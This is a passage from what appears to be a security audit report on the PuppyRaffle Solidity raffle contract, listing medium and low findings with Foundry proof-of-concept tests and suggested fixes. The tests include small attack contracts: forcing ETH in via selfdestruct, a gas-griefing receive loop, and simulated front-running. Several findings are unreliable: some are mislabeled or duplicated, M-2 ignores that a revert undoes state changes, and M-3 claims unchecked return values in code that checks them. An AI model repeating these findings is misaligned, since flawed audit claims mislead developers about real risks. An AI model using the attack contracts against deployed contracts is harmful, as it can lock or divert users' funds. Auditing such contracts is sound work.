    constructor(
        // existing parameters
        address _vrfCoordinator,
        address _linkToken,
        bytes32 _keyHash
    ) 
        ERC721("Puppy Raffle", "PR")
        VRFConsumerBase(_vrfCoordinator, _linkToken)
    {
        // existing initialization
        keyHash = _keyHash;
        fee = 0.1 * 10 ** 18; // 0.1 LINK
    }
    
    function selectWinner() external {
        require(block.timestamp >= raffleStartTime + raffleDuration, "PuppyRaffle: Raffle not over");
        require(players.length >= 4, "PuppyRaffle: Need at least 4 players");
        require(!raffleInProgress, "PuppyRaffle: Raffle already in progress");
        
        raffleInProgress = true;
        
        // Request randomness from Chainlink VRF
        requestRandomness(keyHash, fee);
    }
    
    // Callback function used by VRF Coordinator
    function fulfillRandomness(bytes32 requestId, uint256 randomness) internal override {
        randomResult = randomness;
        
        // Select the winner based on the verified random number
        uint256 winnerIndex = randomResult % players.length;
        address winner = players[winnerIndex];
        
        // Complete the raffle with the verified random winner
        completeRaffle(winner);
    }
    
    function completeRaffle(address winner) private {
        uint256 totalAmountCollected = players.length * entranceFee;
        uint256 prizePool = (totalAmountCollected * 80) / 100;
        uint256 fee = (totalAmountCollected * 20) / 100;
        totalFees = totalFees + uint64(fee);
        
        // Clear state variables
        delete players;
        raffleStartTime = block.timestamp;
        previousWinner = winner;
        raffleInProgress = false;
        
        // Mint the NFT
        uint256 tokenId = totalSupply();
        // ... rarity calculation ...
        _safeMint(winner, tokenId);
        
        // Send the prize pool to the winner
        (bool success, ) = winner.call{value: prizePool}();
        require(success, "PuppyRaffle: Failed to send prize pool to winner");
    }
}
```

Alternatively, if Chainlink VRF is not an option, consider a commit-reveal scheme where users contribute entropy that cannot be predicted by validators.



# Medium Risk Findings

## [M-1]. Integer Overflow/Math issue in PuppyRaffle::selectWinner

## Description
In the refund() function, there's an integer overflow/underflow risk with the totalFees variable. The totalFees is of type uint64 but fee calculations use uint256, and there's potential for overflow when fees accumulate. Additionally, there's no check to ensure sufficient contract balance before refunds.

## Impact
Integer overflow could cause totalFees to wrap around to a small value, leading to incorrect fee accounting and potential loss of funds. Contract could become unable to pay out refunds if balance is insufficient.

## Proof of Concept
1. Many raffles occur with high entrance fees. 2. totalFees accumulates and eventually overflows the uint64 limit (18.4 * 10^18). 3. totalFees wraps to a small value, causing incorrect accounting. 4. Contract owner withdraws more fees than actually collected. 5. Later refunds or operations fail due to insufficient balance.

## Proof of Code
pragma solidity ^0.7.6;
import "forge-std/Test.sol";
import "../src/PuppyRaffle.sol";

contract TestIntegerOverflow is Test {
    PuppyRaffle puppyRaffle;
    address owner = makeAddr("owner");
    address feeAddress = makeAddr("feeAddress");
    
    function setUp() public {
        vm.prank(owner);
        // Set very high entrance fee to trigger overflow faster
        puppyRaffle = new PuppyRaffle(5 ether, feeAddress, 1 days);
    }
    
    function testIntegerOverflow() public {
        // Simulate multiple raffles to accumulate fees
        for(uint256 round = 0; round < 10; round++) {
            // Add 4 players per round
            address[] memory players = new address[](4);
            for(uint256 i = 0; i < 4; i++) {
                players[i] = makeAddr(string(abi.encodePacked("player", round, i)));
                vm.deal(players[i], 5 ether);
            }
            
            // All players enter
            for(uint256 i = 0; i < 4; i++) {
                vm.prank(players[i]);
                address[] memory singlePlayer = new address[](1);
                singlePlayer[0] = players[i];
                puppyRaffle.enterRaffle{value: 5 ether}(singlePlayer);
            }
            
            // Skip time and select winner
            vm.warp(block.timestamp + 1 days + 1);
            puppyRaffle.selectWinner();
        }
        
        // Check if totalFees has reasonable value (shouldn't overflow)
        // With 10 rounds * 4 players * 5 ether * 20% = 40 ether total fees
        // But uint64 max is ~18.4 ether, so overflow occurs
        
        // This would demonstrate the overflow issue
        uint256 expectedFees = 10 * 4 * 5 ether * 20 / 100; // 40 ether
        console.log("Expected total fees:", expectedFees);
        console.log("Actual stored fees (uint64):", uint256(puppyRaffle.totalFees()));
        
        // The actual stored fees will be much less than expected due to overflow
        assertTrue(uint256(puppyRaffle.totalFees()) < expectedFees, "totalFees overflowed");
    }
}

## Suggested Mitigation
Change totalFees from uint64 to uint256 to prevent overflow: `uint256 public totalFees;` and add SafeMath library usage for arithmetic operations: `totalFees = totalFees.add(fee);`

## [M-2]. Unchecked Return issue in PuppyRaffle::withdrawFees

## Description
The withdrawFees() function uses a low-level call without checking the return value properly and doesn't follow the Checks-Effects-Interactions pattern. The function resets totalFees to 0 before ensuring the external call succeeds, creating a potential issue where fees are lost if the call fails after state changes.

## Impact
If the external call to feeAddress fails, the totalFees will already be set to 0, causing permanent loss of fee tracking and potential fund lockup in the contract

## Proof of Concept
1. Contract accumulates fees over time. 2. Owner calls withdrawFees(). 3. totalFees is set to 0 before the external call. 4. External call to feeAddress fails (e.g., feeAddress is a contract that reverts). 5. totalFees remains 0 but funds are still in contract. 6. Fees are permanently lost and cannot be recovered.

## Proof of Code
pragma solidity ^0.7.6;
import "forge-std/Test.sol";
import "../src/PuppyRaffle.sol";

contract RevertingFeeAddress {
    receive() external payable {
        revert("Cannot receive fees");
    }
}

contract TestUncheckedReturn is Test {
    PuppyRaffle puppyRaffle;
    RevertingFeeAddress revertingFeeAddress;
    address owner = makeAddr("owner");
    
    function setUp() public {
        revertingFeeAddress = new RevertingFeeAddress();
        vm.prank(owner);
        puppyRaffle = new PuppyRaffle(1 ether, address(revertingFeeAddress), 1 days);
    }
    
    function testWithdrawFeesFailure() public {
        // Setup and complete a raffle to generate fees
        address[] memory players = new address[](4);
        for(uint256 i = 0; i < 4; i++) {
            players[i] = makeAddr(string(abi.encodePacked("player", i)));
            vm.deal(players[i], 1 ether);
            vm.prank(players[i]);
            address[] memory singlePlayer = new address[](1);
            singlePlayer[0] = players[i];
            puppyRaffle.enterRaffle{value: 1 ether}(singlePlayer);
        }
        
        vm.warp(block.timestamp + 1 days + 1);
        puppyRaffle.selectWinner();
        
        uint256 feesBefore = puppyRaffle.totalFees();
        uint256 contractBalance = address(puppyRaffle).balance;
        
        console.log("Fees before withdrawal:", feesBefore);
        console.log("Contract balance:", contractBalance);
        
        // This should fail but the current implementation has issues
        vm.expectRevert("PuppyRaffle: Failed to withdraw fees");
        puppyRaffle.withdrawFees();
        
        // Verify the state after failed withdrawal
        console.log("Fees after failed withdrawal:", puppyRaffle.totalFees());
    }
}

## Suggested Mitigation
Follow Checks-Effects-Interactions pattern by performing external calls last and only reset state after successful transfer: `uint256 feesToWithdraw = totalFees; (bool success, ) = feeAddress.call{value: feesToWithdraw}(""); require(success, "Failed to withdraw fees"); totalFees = 0;`

## [M-3]. Unchecked Return issue in PuppyRaffle::selectWinner

## Description
The selectWinner() and withdrawFees() functions use low-level call() without checking the return value properly. While they do check the success boolean, they don't handle potential reentrancy or gas griefing attacks through the called contracts.

Vulnerable code:
```solidity
(bool success, ) = winner.call{value: prizePool}("");
require(success, "PuppyRaffle: Failed to send prize pool to winner");

(bool success, ) = feeAddress.call{value: feesToWithdraw}("");
require(success, "PuppyRaffle: Failed to withdraw fees");
```

## Impact
Malicious recipients can grief the protocol by consuming all gas in their receive function, causing the transaction to fail. This can prevent winner selection or fee withdrawal, potentially locking the raffle.

## Proof of Concept
1. Attacker creates a contract with a receive() function that consumes excessive gas
2. Attacker enters the raffle with this contract address
3. When the attacker wins, selectWinner() calls the malicious contract
4. The malicious receive() function consumes all gas, causing the transaction to fail
5. The raffle becomes stuck, unable to select a winner or progress

## Proof of Code
```solidity
contract MaliciousWinner {
    receive() external payable {
        // Consume excessive gas to grief the protocol
        while (true) {
            // Infinite loop or expensive operations
        }
    }
}

function testGasGriefing() public {
    MaliciousWinner malicious = new MaliciousWinner();
    
    address[] memory players = new address[](4);
    players[0] = address(malicious);
    players[1] = address(0x2);
    players[2] = address(0x3);
    players[3] = address(0x4);
    
    vm.deal(address(this), 4 ether);
    puppyRaffle.enterRaffle{value: 4 ether}(players);
    
    vm.warp(block.timestamp + duration + 1);
    
    // This should fail due to gas consumption in malicious contract
    vm.expectRevert();
    puppyRaffle.selectWinner();
}```

## Suggested Mitigation
Use pull-over-push pattern or limit gas for external calls:
```solidity
// Option 1: Pull-over-push pattern
mapping(address => uint256) public pendingWithdrawals;

function selectWinner() external {
    // ... existing logic ...
    
    // Instead of sending directly, record pending withdrawal
    pendingWithdrawals[winner] += prizePool;
    
    // Emit event
    emit WinnerSelected(winner, prizePool);
}

function withdrawPrize() external {
    uint256 amount = pendingWithdrawals[msg.sender];
    require(amount > 0, "No pending withdrawal");
    
    pendingWithdrawals[msg.sender] = 0;
    
    (bool success, ) = msg.sender.call{value: amount}("");
    require(success, "Transfer failed");
}

// Option 2: Limit gas for external calls
function selectWinner() external {
    // ... existing logic ...
    
    (bool success, ) = winner.call{value: prizePool, gas: 2300}("");
    if (!success) {
        // Handle failure gracefully, perhaps by storing for later withdrawal
        pendingWithdrawals[winner] += prizePool;
    }
}```

## [M-4]. MEV issue in PuppyRaffle::enterRaffle

## Description
The contract implements a front-running vulnerability where users can monitor the mempool for selectWinner() transactions and enter the raffle at the last moment to improve their winning odds. The entrance is still open until selectWinner() is called, allowing manipulation of the player pool.

Vulnerable pattern:
```solidity
// No restriction on entering during the selection process
function enterRaffle(address[] memory newPlayers) public payable {
    require(msg.value == entranceFee * newPlayers.length, "PuppyRaffle: Must send enough to enter raffle");
    // ... no time restriction check
}

function selectWinner() external {
    require(block.timestamp >= raffleStartTime + raffleDuration, "PuppyRaffle: Raffle not over");
    // Winner selection logic
}
```

## Impact
Attackers can front-run the selectWinner() transaction by entering the raffle with the same block, manipulating the randomness calculation and increasing their winning probability. This gives unfair advantage to MEV bots and reduces fairness for regular users.

## Proof of Concept
1. Attacker monitors mempool for selectWinner() transactions
2. When they see a selectWinner() call, they quickly send an enterRaffle() transaction with higher gas
3. Their transaction gets included first, adding them to the players array
4. The selectWinner() transaction executes with the attacker now in the pool
5. Since randomness includes msg.sender and block data, attacker can calculate optimal entry timing

## Proof of Code
```solidity
function testFrontRunning() public {
    // Setup initial players
    address[] memory initialPlayers = new address[](3);
    initialPlayers[0] = address(0x1);
    initialPlayers[1] = address(0x2);
    initialPlayers[2] = address(0x3);
    
    vm.deal(address(this), 10 ether);
    puppyRaffle.enterRaffle{value: 3 ether}(initialPlayers);
    
    // Fast forward to end of raffle
    vm.warp(block.timestamp + duration + 1);
    
    // Simulate front-running: attacker enters just before selectWinner
    address attacker = address(0x999);
    address[] memory attackerEntry = new address[](1);
    attackerEntry[0] = attacker;
    
    vm.prank(attacker);
    vm.deal(attacker, 1 ether);
    puppyRaffle.enterRaffle{value: 1 ether}(attackerEntry);
    
    // Now selectWinner runs with attacker in the pool
    puppyRaffle.selectWinner();
    
    // Attacker has 1/4 chance instead of 0 chance
    // This demonstrates the front-running vulnerability
}```

## Suggested Mitigation
Implement entry deadline or commit-reveal scheme:
```solidity
// Option 1: Entry deadline
uint256 public entryDeadline;

constructor(uint256 _entranceFee, address _feeAddress, uint256 _raffleDuration) {
    // ... existing code ...
    entryDeadline = raffleStartTime + _raffleDuration - 1 hours; // Entries close 1 hour before selection
}

function enterRaffle(address[] memory newPlayers) public payable {
    require(block.timestamp <= entryDeadline, "PuppyRaffle: Entry period closed");
    require(msg.value == entranceFee * newPlayers.length, "PuppyRaffle: Must send enough to enter raffle");
    // ... rest of function
}

// Option 2: Two-phase commit-reveal
mapping(address => bytes32) public commitments;
uint256 public commitPhaseEnd;
uint256 public revealPhaseEnd;

function commitEntry(bytes32 commitment) external payable {
    require(block.timestamp <= commitPhaseEnd, "Commit phase ended");
    commitments[msg.sender] = commitment;
}

function revealEntry(address[] memory players, uint256 nonce) external {
    require(block.timestamp <= revealPhaseEnd, "Reveal phase ended");
    require(block.timestamp > commitPhaseEnd, "Still in commit phase");
    
    bytes32 commitment = keccak256(abi.encodePacked(players, nonce));
    require(commitments[msg.sender] == commitment, "Invalid reveal");
    
    // Add players to raffle
}```

## [M-5]. Unchecked Return issue in PuppyRaffle::withdrawFees

## Description
The withdrawFees function contains an incorrect balance check that compares the contract's total balance with totalFees. The check `require(address(this).balance == uint256(totalFees), "PuppyRaffle: There are currently players active!")` fails to account for the fact that the contract may hold both prize pool funds (from active players) and accumulated fees, making the withdrawal impossible when players are active.

## Impact
The fee withdrawal mechanism is broken. When there are active players in the raffle, their entrance fees are held in the contract along with accumulated fees from previous raffles. The balance equality check will fail, preventing legitimate fee withdrawals even when fees are available.

## Proof of Concept
1. First raffle completes, leaving accumulated fees in totalFees. 2. New players enter a second raffle, adding their entrance fees to the contract balance. 3. Contract balance now equals (entrance fees from new players + accumulated fees). 4. Attempt to withdraw fees fails because balance > totalFees. 5. Fees remain stuck in the contract.

## Proof of Code
pragma solidity ^0.7.6;
import "forge-std/Test.sol";
import "../src/PuppyRaffle.sol";

contract WithdrawFeesTest is Test {
    PuppyRaffle puppyRaffle;
    address feeAddress = address(0x99);
    
    function setUp() public {
        puppyRaffle = new PuppyRaffle(1 ether, feeAddress, 1 days);
    }
    
    function testWithdrawFeesFailsWithActivePlayers() public {
        // First raffle
        address[] memory players1 = new address[](4);
        for (uint256 i = 0; i < 4; i++) {
            players1[i] = address(uint160(i + 1));
        }
        
        vm.deal(address(this), 8 ether);
        puppyRaffle.enterRaffle{value: 4 ether}(players1);
        vm.warp(block.timestamp + 1 days);
        puppyRaffle.selectWinner();
        
        // Now contract has totalFees = 0.8 ether from first raffle
        
        // Second raffle with new players
        address[] memory players2 = new address[](2);
        players2[0] = address(0x10);
        players2[1] = address(0x11);
        
        puppyRaffle.enterRaffle{value: 2 ether}(players2);
        
        // Contract balance is now 2.8 ether (0.8 fees + 2 ether new players)
        // totalFees is still 0.8 ether
        // withdrawFees should fail because balance != totalFees
        
        vm.expectRevert("PuppyRaffle: There are currently players active!");
        puppyRaffle.withdrawFees();
    }
}

## Suggested Mitigation
Modify the balance check to allow fee withdrawal when sufficient fees are available: ```solidity
function withdrawFees() external {
    require(totalFees > 0, "PuppyRaffle: No fees to withdraw");
    require(address(this).balance >= uint256(totalFees), "PuppyRaffle: Insufficient balance");
    
    uint256 feesToWithdraw = totalFees;
    totalFees = 0;
    
    (bool success, ) = feeAddress.call{value: feesToWithdraw}("");
    require(success, "PuppyRaffle: Failed to withdraw fees");
}

// Alternative: Add owner-only emergency withdrawal
function emergencyWithdrawFees() external onlyOwner {
    require(totalFees > 0, "PuppyRaffle: No fees to withdraw");
    
    uint256 feesToWithdraw = totalFees;
    totalFees = 0;
    
    (bool success, ) = feeAddress.call{value: feesToWithdraw}("");
    require(success, "PuppyRaffle: Failed to withdraw fees");
}```

## [M-6]. Zero Code issue in PuppyRaffle::getActivePlayerIndex

## Description
The `getActivePlayerIndex` function is used to find a player's index in the array but incorrectly returns 0 if the player is not found. Since 0 is a valid index (for the first player), this function can lead to false positives where a non-existent player is incorrectly identified as the first player in the array.

```solidity
function getActivePlayerIndex(address player) external view returns (uint256) {
    for (uint256 i = 0; i < players.length; i++) {
        if (players[i] == player) {
            return i;
        }
    }
    return 0;
}
```

## Impact
Functions that rely on `getActivePlayerIndex` to check if a player exists may falsely assume a player is in the raffle when they're not, leading to incorrect contract behavior. This can cause confusion for users and potentially impact related functionality like refunds.

## Proof of Concept
1. Alice is the first player in the raffle (index 0)
2. Bob wants to check if Charlie is in the raffle
3. Bob calls `getActivePlayerIndex(charlie_address)` which returns 0
4. Bob incorrectly concludes that Charlie is in the raffle (at index 0), when actually Alice is at index 0 and Charlie is not in the raffle at all

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity 0.8.19;

import {Test, console} from "forge-std/Test.sol";
import {PuppyRaffle} from "../src/PuppyRaffle.sol";

contract GetActivePlayerIndexTest is Test {
    PuppyRaffle puppyRaffle;
    address alice = makeAddr("alice");
    address bob = makeAddr("bob");
    address charlie = makeAddr("charlie");
    uint256 entranceFee = 1 ether;
    
    function setUp() public {
        puppyRaffle = new PuppyRaffle(entranceFee, address(this), 1 days);
        
        // Fund accounts
        vm.deal(alice, 10 ether);
        vm.deal(bob, 10 ether);
    }

    function testGetActivePlayerIndexAmbiguity() public {
        // Alice enters the raffle as the first player (index 0)
        address[] memory players = new address[](1);
        players[0] = alice;
        
        vm.prank(alice);
        puppyRaffle.enterRaffle{value: entranceFee}(players);
        
        // Check Alice's index - should be 0
        uint256 aliceIndex = puppyRaffle.getActivePlayerIndex(alice);
        assertEq(aliceIndex, 0);
        
        // Check Charlie's index - he's not in the raffle, but it also returns 0!
        uint256 charlieIndex = puppyRaffle.getActivePlayerIndex(charlie);
        assertEq(charlieIndex, 0);
        
        // This ambiguity means we can't tell if Charlie is in the raffle or not
        // just by looking at the return value
        console.log("Alice's index:", aliceIndex);
        console.log("Charlie's index (not in raffle):", charlieIndex);
        console.log("This ambiguity makes it impossible to distinguish between the first player and a non-existent player");
    }
}

## Suggested Mitigation
Modify the function to return a distinct value (like uint256 max) or revert when a player is not found, or better yet, return a boolean along with the index:

```solidity
function getActivePlayerIndex(address player) external view returns (uint256, bool) {
    for (uint256 i = 0; i < players.length; i++) {
        if (players[i] == player) {
            return (i, true);
        }
    }
    return (0, false);
}
```

Alternatively, you could use a mapping to track player indices for O(1) lookups:

```solidity
// Add a mapping to track player indices
mapping(address => uint256) private playerIndices;
mapping(address => bool) private isActivePlayer;

// Update enterRaffle to track indices
function enterRaffle(address[] memory newPlayers) public payable {
    // ... existing code ...
    
    for (uint256 i = 0; i < newPlayers.length; i++) {
        players.push(newPlayers[i]);
        playerIndices[newPlayers[i]] = players.length - 1;
        isActivePlayer[newPlayers[i]] = true;
    }
    
    // ... existing code ...
}

// Update refund to mark players as inactive
function refund(uint256 playerIndex) public {
    // ... existing code ...
    isActivePlayer[playerAddress] = false;
    players[playerIndex] = address(0);
    // ... existing code ...
}

// Update getActivePlayerIndex to use the mapping
function getActivePlayerIndex(address player) external view returns (uint256, bool) {
    return (playerIndices[player], isActivePlayer[player]);
}
```

## [M-7]. Unexpected Eth issue in PuppyRaffle::withdrawFees

## Description
The `withdrawFees` function in the PuppyRaffle contract has a strict balance check that can prevent fee withdrawal if there are any unexpected ETH transfers to the contract.

```solidity
function withdrawFees() external {
    require(address(this).balance == uint256(totalFees), "PuppyRaffle: There are currently players active!");
    // ... rest of the function ...
}
```

## Impact
If the contract receives ETH through means other than the raffle entrance fees (such as through selfdestruct or coinbase transactions), the balance check in withdrawFees will fail, preventing the owner from withdrawing legitimate fees. This could lead to fees being permanently locked in the contract.

## Proof of Concept
1. The contract accumulates fees through normal operation
2. An attacker sends a small amount of ETH to the contract using selfdestruct
3. Now address(this).balance > totalFees
4. When the owner tries to call withdrawFees(), the require check fails
5. The fees are locked in the contract indefinitely

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/PuppyRaffle.sol";

contract SelfDestructAttacker {
    function attack(address payable target) external payable {
        selfdestruct(target);
    }
}

contract UnexpectedEthTest is Test {
    PuppyRaffle puppyRaffle;
    SelfDestructAttacker attacker;
    address owner = address(1);
    uint256 entranceFee = 1e18;
    
    function setUp() public {
        vm.prank(owner);
        puppyRaffle = new PuppyRaffle(entranceFee, owner, 1 days);
        attacker = new SelfDestructAttacker();
        
        // Fund the attacker
        vm.deal(address(attacker), 0.1 ether);
        
        // Enter some players to generate fees
        address[] memory players = new address[](4);
        for (uint256 i = 0; i < 4; i++) {
            players[i] = address(uint160(i + 100));
        }
        vm.deal(address(this), 4 * entranceFee);
        puppyRaffle.enterRaffle{value: 4 * entranceFee}(players);
        
        // Fast forward to raffle end time
        vm.warp(block.timestamp + 1 days);
        
        // Select winner to generate fees
        puppyRaffle.selectWinner();
    }
    
    function testUnexpectedEthAttack() public {
        // Verify there are fees to withdraw
        uint256 initialFees = puppyRaffle.totalFees();
        assertTrue(initialFees > 0, "No fees generated");
        
        // Verify initial contract balance equals totalFees
        assertEq(address(puppyRaffle).balance, initialFees, "Initial balance should equal totalFees");
        
        // Send unexpected ETH via selfdestruct
        attacker.attack{value: 0.1 ether}(payable(address(puppyRaffle)));
        
        // Verify contract balance is now greater than totalFees
        assertTrue(address(puppyRaffle).balance > initialFees, "Attack failed to send ETH");
        
        // Try to withdraw fees - should fail
        vm.prank(owner);
        vm.expectRevert("PuppyRaffle: There are currently players active!");
        puppyRaffle.withdrawFees();
        
        // Fees are now locked in the contract
        console.log("Locked fees:", initialFees);
        console.log("Contract balance:", address(puppyRaffle).balance);
    }
}

## Suggested Mitigation
Modify the withdrawFees function to allow withdrawal of the recorded fees amount regardless of the contract's actual balance:

```solidity
function withdrawFees() external {
    uint256 feesToWithdraw = totalFees;
    require(feesToWithdraw > 0, "PuppyRaffle: No fees to withdraw");
    require(address(this).balance >= feesToWithdraw, "PuppyRaffle: Insufficient balance");
    
    totalFees = 0;
    
    (bool success, ) = feeAddress.call{value: feesToWithdraw}("");
    require(success, "PuppyRaffle: Failed to withdraw fees");
}
```

This change allows the owner to withdraw the recorded fees even if there's additional ETH in the contract.

## [M-8]. Integer Overflow/Math issue in PuppyRaffle::getActivePlayerIndex

## Description
The `getActivePlayerIndex` function incorrectly returns 0 when a player is not found. This is ambiguous because 0 is also a valid index for the first player. This makes it impossible to distinguish between "player is at index 0" and "player not found".

## Impact
This ambiguity could lead to incorrect behavior in external contracts or UI applications that rely on this function. If index 0 is interpreted as "player not found" when the player is actually at index 0, it could result in incorrect business logic. For example, a UI might incorrectly show that a user hasn't entered the raffle when they have.

## Proof of Concept
1. User A enters the raffle and is at index 0 in the players array
2. User B (who hasn't entered) calls getActivePlayerIndex
3. For both users, the function returns 0
4. A front-end application cannot distinguish whether User B has entered the raffle or not

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/PuppyRaffle.sol";

contract ActivePlayerIndexTest is Test {
    PuppyRaffle puppyRaffle;
    address player1 = address(1);
    address player2 = address(2);
    
    function setUp() public {
        puppyRaffle = new PuppyRaffle(
            1 ether,
            address(3),
            1 days
        );
        
        // Player 1 enters the raffle
        address[] memory players = new address[](1);
        players[0] = player1;
        vm.prank(player1);
        puppyRaffle.enterRaffle{value: 1 ether}(players);
    }
    
    function testActivePlayerIndexAmbiguity() public {
        // Get index for player1 who is at index 0
        uint256 player1Index = puppyRaffle.getActivePlayerIndex(player1);
        assertEq(player1Index, 0);
        
        // Get index for player2 who hasn't entered - also returns 0
        uint256 player2Index = puppyRaffle.getActivePlayerIndex(player2);
        assertEq(player2Index, 0);
        
        // Now we can't tell if player2 is at index 0 or not in the raffle at all
        // Both cases return the same value: 0
    }
}

## Suggested Mitigation
Modify the `getActivePlayerIndex` function to return a special value (like uint256.max) or use a separate boolean return value to indicate when a player is not found.

```solidity
function getActivePlayerIndex(address player) external view returns (uint256, bool) {
    for (uint256 i = 0; i < players.length; i++) {
        if (players[i] == player) {
            return (i, true);
        }
    }
    return (0, false); // Return false as second parameter to indicate player not found
}
```

Alternatively:

```solidity
function getActivePlayerIndex(address player) external view returns (uint256) {
    for (uint256 i = 0; i < players.length; i++) {
        if (players[i] == player) {
            return i;
        }
    }
    return type(uint256).max; // Return max uint to indicate player not found
}
```



# Low Risk Findings

## [L-1]. Pragma issue in PuppyRaffle::NA

## Description
The contract uses Solidity version 0.7.6 which is outdated and contains known security vulnerabilities. Additionally, there's no explicit pragma statement shown, which could lead to compilation with unintended compiler versions.

## Impact
Using outdated Solidity versions exposes the contract to known compiler bugs and security issues. Lack of explicit pragma statements can cause unexpected behavior across different compiler versions.

## Proof of Concept
1. Contract is deployed with Solidity 0.7.6. 2. Known vulnerabilities in this version could be exploited. 3. Compiler bugs may cause unexpected behavior. 4. Future deployments might use different compiler versions if pragma is not specified.

## Proof of Code
// Demonstration of version check
pragma solidity ^0.7.6;
// This version has known issues and should be updated
contract VersionTest {
    function checkVersion() external pure returns (string memory) {
        return "Using vulnerable Solidity version 0.7.6";
    }
}

## Suggested Mitigation
Update to the latest stable Solidity version (0.8.x or later) and use explicit pragma statements: `pragma solidity 0.8.19;` Also consider using OpenZeppelin's latest contract versions compatible with newer Solidity versions.

## [L-2]. Unexpected Eth issue in PuppyRaffle::NA

## Description
The contract can receive Ether through various functions but doesn't have proper handling for unexpected Ether sent directly to the contract. There's no receive() or fallback() function to handle direct Ether transfers, which could lock funds in the contract.

## Impact
Ether sent directly to the contract without calling specific functions will be locked permanently. The withdrawFees() function assumes contract balance equals totalFees, which would be incorrect if unexpected Ether is received.

## Proof of Concept
1. Someone accidentally sends Ether directly to the contract address. 2. The Ether gets locked as there's no way to retrieve it. 3. The withdrawFees() function's balance check fails because contract balance includes unexpected Ether. 4. Contract functionality becomes impaired.

## Proof of Code
pragma solidity ^0.7.6;
import "forge-std/Test.sol";
import "../src/PuppyRaffle.sol";

contract TestUnexpectedEth is Test {
    PuppyRaffle puppyRaffle;
    address owner = makeAddr("owner");
    address feeAddress = makeAddr("feeAddress");
    
    function setUp() public {
        vm.prank(owner);
        puppyRaffle = new PuppyRaffle(1 ether, feeAddress, 1 days);
    }
    
    function testUnexpectedEther() public {
        // Send unexpected Ether to the contract
        vm.deal(address(this), 5 ether);
        
        // This will fail because there's no receive/fallback function
        vm.expectRevert();
        payable(address(puppyRaffle)).transfer(1 ether);
        
        // If there was a way to send Ether, it would affect the balance check
        uint256 contractBalance = address(puppyRaffle).balance;
        uint256 totalFees = uint256(puppyRaffle.totalFees());
        
        console.log("Contract balance:", contractBalance);
        console.log("Total fees:", totalFees);
        
        // The withdrawFees function would fail if balance != totalFees
    }
}

## Suggested Mitigation
Add explicit receive() and fallback() functions that revert to prevent accidental Ether transfers: `receive() external payable { revert("Direct payments not accepted"); }` or implement proper handling if direct payments should be accepted.



